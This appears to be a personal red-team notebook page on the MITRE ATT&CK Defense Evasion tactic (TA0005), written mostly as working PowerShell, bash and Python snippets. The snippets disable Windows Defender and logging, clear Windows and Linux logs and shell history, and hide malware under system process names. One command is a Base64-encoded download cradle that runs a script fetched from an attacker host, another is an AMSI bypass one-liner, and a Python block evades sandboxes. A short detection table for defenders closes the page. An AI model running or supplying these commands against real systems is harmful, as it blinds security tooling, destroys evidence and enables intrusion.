---
type: tactic-hub
room: red
tactic: "Defense Evasion"
tactic_id: "TA0005"
tags: [red/defense-evasion, mitre/TA0005]
date_updated: {{date}}
---

# TA0005 — Defense Evasion

> [!quote]
> *"My name is Sherlock Holmes. It is my business to know what other people don't know."*
> — *The Adventure of the Blue Carbuncle*

**MITRE Reference:** [TA0005](https://attack.mitre.org/tactics/TA0005/) | **Kill Chain Phase:** Post-exploitation

The adversary is trying to avoid being detected. The most dangerous adversaries are the ones you never see. Defense evasion is the art of operating in plain sight — disabling sensors, blending into noise, and leaving no trace.

---

## Techniques in This Tactic

| Technique ID | Name | Platform |
|-------------|------|---------|
| [[T1562 - Impair Defenses]] | Impair Defenses (disable AV/EDR/logging) | All |
| [[T1070 - Indicator Removal]] | Clear logs / delete artefacts | All |
| [[T1036 - Masquerading]] | Masquerade as legitimate process | All |
| [[T1055 - Process Injection]] | Inject into legitimate process | Windows |
| [[T1574 - Hijack Execution Flow]] | DLL Hijacking | Windows |
| [[T1027 - Obfuscated Files or Information]] | Obfuscation / encoding | All |
| [[T1218 - System Binary Proxy Execution]] | LOLBins (mshta, regsvr32) | Windows |
| [[T1134 - Access Token Manipulation]] | Token impersonation | Windows |
| [[T1497 - Virtualization Sandbox Evasion]] | Anti-sandbox checks | All |
| [[T1620 - Reflective Code Loading]] | Reflective DLL / in-memory execution | Windows |

---

## Standard Evasion Workflows

### Disable Windows Defender / AV (T1562.001)
```powershell
# Requires admin/SYSTEM
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true

# Add exclusion path (less suspicious than disabling)
Add-MpPreference -ExclusionPath "C:\Temp"
Add-MpPreference -ExclusionProcess "payload.exe"

# Stop Defender service
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled
```

### Disable Logging (T1562.002)
```powershell
# Disable PowerShell ScriptBlock logging
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Stop Windows Event Log service (very noisy — don't)
Stop-Service -Name EventLog

# Clear specific event logs (T1070.001)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Clear all event logs
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
```

### Clear Linux Logs (T1070.002)
```bash
# Clear auth log
echo > /var/log/auth.log
echo > /var/log/syslog

# Remove bash history
unset HISTFILE
export HISTSIZE=0
cat /dev/null > ~/.bash_history
history -c

# Remove specific lines from auth.log (surgical)
sed -i '/attacker_ip/d' /var/log/auth.log

# Set HISTFILE to /dev/null for session
export HISTFILE=/dev/null
```

### Process Injection (T1055)
```powershell
# Inject shellcode into a legitimate process via PowerShell
# (Invoke-ReflectivePEInjection pattern — use a tool like Cobalt Strike / Empire)
# Manual: VirtualAllocEx → WriteProcessMemory → CreateRemoteThread

# Find a good target process (svchost, explorer, notepad)
Get-Process | Where-Object { $_.Name -eq "explorer" } | Select-Object Id
```

### DLL Hijacking (T1574.001)
```bash
# Find DLLs loaded from writable locations (Procmon method)
# Look for: NAME NOT FOUND, path in user-writable directory

# Create the malicious DLL in the writable path
# Use msfvenom or custom DLL with correct exports

# Verify writable path
icacls "C:\Program Files\VulnApp\"
```

### Obfuscation (T1027)
```powershell
# Base64 encode a command
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
# Then: powershell -enc <result>

# String concatenation to evade static detection
$a = "Inv"; $b = "oke-Exp"; $c = "ression"
& ($a+$b+$c) "whoami"

# AMSI bypass (patch amsiInitFailed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Masquerading (T1036)
```bash
# Rename binary to look like a system process
cp /tmp/malware /tmp/svchost
# Or on Windows:
copy payload.exe %SYSTEMROOT%\System32\svchost.exe

# Prepend spaces to process name (anti-ps tricks)
cp payload /tmp/"  systemd"
```

### Anti-Sandbox Checks (T1497)
```python
import os, time, ctypes

# Check username (sandboxes often use generic names)
if os.getlogin() in ["sandbox", "maltest", "user", "John", "cuckoo"]:
    exit()

# Check number of CPUs (VMs often have 1-2)
import multiprocessing
if multiprocessing.cpu_count() < 2:
    exit()

# Check uptime (sandboxes have short uptimes)
import subprocess
uptime = subprocess.check_output("uptime -p", shell=True).decode()
# If < 10 minutes, likely sandbox
```

---

## OPSEC Considerations

> [!warning] Evasion Can Itself Be a Signal
> - Clearing all event logs simultaneously triggers Event 1102 (audit log cleared) — a tier-1 SOC alert.
> - `Set-MpPreference -Disable*` is logged by Defender telemetry to Microsoft even before Defender is disabled.
> - Process injection into `lsass.exe` is monitored by **every** modern EDR.
> - AMSI patches are detected by pattern — use commercial C2 tools with built-in evasion for real engagements.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| Defender disabled | Defender (5001) | Real-time protection turned off |
| Audit log cleared | Security (1102/104) | Log clear event — high priority |
| Process injection | Sysmon 10 | Access to protected process |
| Encoded PowerShell | Security (4688) | `-enc` flag in CommandLine |
| DLL loaded from temp | Sysmon 7 | DLL loaded from writable path |
| AMSI bypass | PS ScriptBlock (4104) | Known AMSI patch strings |

---

## Related Notes

- [[TA0004 - Privilege Escalation]] ← Precedes this
- [[TA0006 - Credential Access]] ← Often paired
- [[TA0003 - Persistence]] ← Hiding persistence mechanisms

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
